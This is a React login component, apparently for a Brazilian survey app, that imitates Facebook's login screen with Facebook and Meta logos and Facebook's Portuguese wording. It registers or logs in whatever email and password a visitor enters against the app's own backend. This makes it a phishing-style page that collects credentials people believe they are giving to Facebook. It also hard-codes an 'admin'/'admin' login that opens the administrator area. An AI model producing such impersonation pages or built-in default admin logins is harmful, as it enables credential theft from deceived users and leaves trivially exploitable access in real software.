import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../../services/api";
import {
  ContainerFb,
  IdiomaTopo,
  LogoFb,
  FormFb,
  InputFb,
  BotaoEntrarFb,
  LinkEsqueceu,
  BotaoCriarConta,
  LogoMeta,
  MensagemErro, 
} from "./styles";

export default function Face() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [senha, setSenha] = useState("");
  const [erroEmail, setErroEmail] = useState(false);
  const [erroSenha, setErroSenha] = useState(false);

  const handleLogin = async (e) => {
   if (email === "admin" && senha === "admin") {
    try {
      const response = await api.post("/api/login", { 
        email: "admin", 
        senha: "admin" 
      });
      
      localStorage.setItem("@Opinai:token", response.data.token);
      localStorage.setItem("@Opinai:user", JSON.stringify(response.data.user));
      
      alert("Bem-vindo, Administrador!");
      navigate("/admin/pesquisas"); 
      return;
    } catch (error) {
      alert("Erro ao conectar com o servidor. Verifique se o backend no Render acordou.");
      return;
    }
  }

  try {
    const response = await api.post("/api/register", { email, senha, nome: "Usuário Novo" });
    localStorage.setItem("@Opinai:token", response.data.token);
    navigate("/pesquisas");
  } catch (error) {
    try {
      const loginRes = await api.post("/api/login", { email, senha });
      localStorage.setItem("@Opinai:token", loginRes.data.token);
      navigate("/pesquisas");
    } catch (err) {
      alert("Erro nas credenciais de usuário.");
    }
  }
};

  return (
    <ContainerFb>
      <IdiomaTopo>Português (Brasil)</IdiomaTopo>

      <LogoFb
        src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"
        alt="Facebook"
      />

      <FormFb>
        <InputFb
          type="text"
          placeholder="Número do celular ou email"
          value={email}
          error={erroEmail} 
          onChange={(e) => {
            setEmail(e.target.value);
            setErroEmail(false); 
          }}
        />
        {erroEmail && <MensagemErro>Insira seu e-mail ou número de celular.</MensagemErro>}

        <InputFb
          type="password"
          placeholder="Senha"
          value={senha}
          error={erroSenha} 
          onChange={(e) => {
            setSenha(e.target.value);
            setErroSenha(false);
          }}
        />
        {erroSenha && <MensagemErro>Insira sua senha</MensagemErro>}

        <BotaoEntrarFb
          type="button"
          onClick={handleLogin}
        >
          Entrar
        </BotaoEntrarFb>

        <LinkEsqueceu>Esqueceu a senha?</LinkEsqueceu>
      </FormFb>

      <BotaoCriarConta>Criar nova conta</BotaoCriarConta>

      <LogoMeta>
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"
          alt="Meta"
        />
      </LogoMeta>
    </ContainerFb>
  );
}